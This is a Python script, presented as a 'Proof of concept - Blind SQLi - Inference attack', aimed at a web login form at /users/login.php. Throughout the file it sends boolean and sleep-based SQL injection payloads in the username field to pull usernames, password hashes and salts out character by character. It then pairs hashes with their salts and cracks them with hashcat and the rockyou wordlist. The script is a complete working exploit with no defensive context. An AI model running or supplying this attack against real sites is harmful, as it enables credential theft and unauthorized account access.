#!/usr/bin/python3

import requests, sys, threading, os, time, copy
from enum import Enum

salts = []
hashes = []
usernames = []


class brute_forcing(Enum):
    USERNAMES = 1
    PASSWORDS = 2
    SALTS = 3


login_url = "/users/login.php"
sleep_time = 0
attack_method = ""
number_of_requests = 0

def reduce_search_space(character_space, state, method):
    login_data = {
        'username': '',
        'password' : ''
    }

    temp = copy.deepcopy(character_space)

    for c in temp:
        if state == brute_forcing.USERNAMES:
            login_data['username'] = '%' + c + '%\'' + method + ' -- \#'
        else:
            login_data['username'] = '\' or salt like binary \'%' + c+ '%\'' + method + ' -- \#'

        if not sqli(login_data, method):
            character_space.remove(c)

def check_login(entry, state, method):
    login_data = {
        'username': '',
        'password' : ''
    }

    if state == brute_forcing.USERNAMES:
        login_data['username'] =  entry + '\'' + method + ' -- \#'
    elif state == brute_forcing.PASSWORDS:
        login_data['username'] = '\' or password like \'' + entry+ '\'' + method + ' -- \#'
    else:
        login_data['username'] = '\' or salt like binary \'' + entry+ '\'' + method + ' -- \#'
    return sqli(login_data, method)

def brute_force_attack(character_space, state, method):
    login_data = {
        'username': '',
        'password' : ''
    }

    space_size = len(character_space)
    possible_usernames = []
    cracked_users = []

    print (state, method)
    recursive_brute_force(character_space, "", state,cracked_users, method)
    if state == brute_forcing.USERNAMES:
        global usernames
        usernames = cracked_users
    elif state == brute_forcing.PASSWORDS:
        global hashes
        hashes = cracked_users
    else:
        global salts
        salts = cracked_users
    print ("Found all", str(state)[str(state).find(".")+1 :])

def recursive_brute_force(character_space, progress, state, cracked_users, method):
    global attack_method
    if (attack_method == "sleep"):
        print (progress)
    login_data = {
        'username': '',
        'password' : ''
    }

    for i,c in enumerate(character_space):
        if state == brute_forcing.USERNAMES:
            login_data['username'] =  progress + c + '%\'' + method + ' -- \#'
        elif state == brute_forcing.PASSWORDS:
            login_data['username'] = '\' or password like \'' + progress + c + '%\'' + method + ' -- \#'
        else:
            login_data['username'] = '\' or salt like binary \'' + progress +c + '%\'' + method + ' -- \#'
        if sqli(login_data, method):
            if check_login(progress +c, state, method):
                cracked_users.append(progress +c)
                print('found:',progress + c)
            else:
                recursive_brute_force(character_space, progress + c, state, cracked_users, method)

def sqli(login_data, method):
    global ip
    global login_url
    global sleep_time
    global attack_method
    global number_of_requests
    number_of_requests += 1
    before = time.time()
    resp = requests.post(ip + login_url, login_data)
    if attack_method == "login":
        return resp.text[1971:1981] == "<h2>Hello "
    else:
        return (time.time() - before) > sleep_time

def crack_hashes():
    print("\nLaunching hashcat (press s to view progress)")
    os.system("hashcat -a 0 hashes.file -m 110 wordlists/wordlist wordlists/rockyou.txt -o outfile.txt --outfile-format=3 --force --potfile-disable --quiet")

def correlate(method):
    global usernames
    global hashes
    global salts

    print ("\nCorrelating hashes with corresponding salt\n")

    login_data = {
        'username': '',
        'password' : ''
    }
    correlated_hashes = []

    pairs = {}
    for h in hashes:
        for s in salts:
            if h in correlated_hashes:
                break
            login_data['username'] = '\' or password like \'' + h +'\' and salt like \'' + s + '\' -- \#'
            if sqli(login_data, method):
                pairs[h] = s

    with open('hashes.file', 'w') as f:
        for k,v in pairs.items():
            print(k+":"+v)
            f.write(k+":"+v+"\n")




def main():
    global login_url
    global ip
    if (len(sys.argv) < 3):
        print ("usage: ./poc.py [target ip/url] [type (time/login)]")
        sys.exit(0)

    with open('ascii.txt', 'r') as f:
        print(f.read())
    print ("Proof of concept - Blind SQLi - Inference attack\n")
    # add asci art
    global attack_method
    ip = sys.argv[1]
    attack_method = sys.argv[2]
    global sleep_time
    if attack_method == "sleep":
        sleep_time = float(sys.argv[3])
    begin = time.time()

    if not 'http' in ip:
        ip = "http://" + ip


    proxy = {'http' : "http://127.0.0.1:8080"}

    username_character_space = list(map(lambda x: chr(x), [33, 35, 36, 64, 63, 61] + [x for x in range(48, 58)] + [x for x in range(97, 123)] ))

    salt_character_space = copy.deepcopy(username_character_space) + list(map(lambda x : chr(x), [x for x in range (65,91)]))

    password_character_space = list(map(lambda x: chr(x), [x for x in range(48, 58)] + [x for x in range(97, 103)]))


    import operator
    from functools import reduce
    method = "" if attack_method == "login" else " and sleep(" + str(sleep_time) + ")"
    # correlate(method)
    # crack_hashes()


    if attack_method == "login":
        print("Performing LOGIN-event-based inference attack\n")
    else:
        print("Performing SLEEP-based inference attack\n")
    print ("Reducing username search space from [" + reduce(operator.add, username_character_space) + "]")
    reduce_search_space(username_character_space, brute_forcing.USERNAMES, method)
    print ("Reduced to [" + reduce(operator.add, username_character_space) + "]\n")

    print ("Reducing salt search space from [" + reduce(operator.add, salt_character_space) + "]")
    reduce_search_space(salt_character_space, brute_forcing.SALTS, method)
    print ("Reduced to [" + reduce(operator.add, salt_character_space) + "]\n")

    time.sleep(1)

    if attack_method == "login":
        salt_brute_forcer = threading.Thread( target=brute_force_attack, args=(salt_character_space, brute_forcing.SALTS,method,))
        username_brute_forcer = threading.Thread(target=brute_force_attack, args=(username_character_space, brute_forcing.USERNAMES,method,))
        password_brute_forcer = threading.Thread(target=brute_force_attack, args=(password_character_space, brute_forcing.PASSWORDS,method,))
        salt_brute_forcer.start()
        username_brute_forcer.start()
        password_brute_forcer.start()
        salt_brute_forcer.join(); username_brute_forcer.join(); password_brute_forcer.join();
    else:
        brute_force_attack(salt_character_space, brute_forcing.SALTS,method)
        brute_force_attack(username_character_space, brute_forcing.USERNAMES,method)
        brute_force_attack(password_character_space, brute_forcing.PASSWORDS,method)

    end = time.time() - begin

    global number_of_requests
    global usernames
    global salts
    global hashes

    print('\n{:>10}{:>6}   {:<50}'.format('Usernames', 'Salt', 'Passwords'))
    for (user, salt, hash_) in zip(usernames, salts,hashes):
        print('{:>10}{:>6}   {:<50}'.format(user, salt, hash_))

    print("\nDone in: \t\t\t", str(round(end,2)) + 's')
    print("Number of requests made: \t", number_of_requests)
    print("Average requests/s: \t\t", str(round(number_of_requests / end, 2)) + "/s")

    inp = input("\n\nRun hashcat on hash + salt combinatons? (y/n): ")
    if inp != "y":
        exit(0)
    correlate(method)
    crack_hashes()
    print("\nRecovered:\n\n")
    with open('outfile.txt', 'r') as f:
        for line in f:
            print (line, end="")


if __name__ == "__main__":
    main()
